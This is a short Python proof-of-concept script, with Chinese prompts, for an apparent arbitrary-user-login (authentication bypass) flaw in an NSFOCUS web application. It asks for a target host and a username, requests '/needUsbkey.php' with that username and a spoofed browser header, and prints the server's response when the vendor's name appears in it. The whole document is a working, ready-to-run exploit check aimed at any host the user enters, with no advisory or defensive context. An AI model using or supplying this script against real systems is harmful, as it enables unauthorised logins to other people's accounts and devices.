import requests  
  
host = input("请输入目标主机地址：")  
username = input("请输入用户名：")  
  
headers = {  
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",  
    "Content-Type": "application/x-www-form-urlencoded",  
    "Connection": "close"  
}  
  
payload = "/needUsbkey.php?username=" + username  
url = f"http://{host}/{payload}"  
response = requests.get(url, headers=headers)  
  
if "绿盟" in response.text:  
    print("任意用户登录漏洞存在！")  
    print(response.text)  
else:  
    print("任意用户登录漏洞不存在。")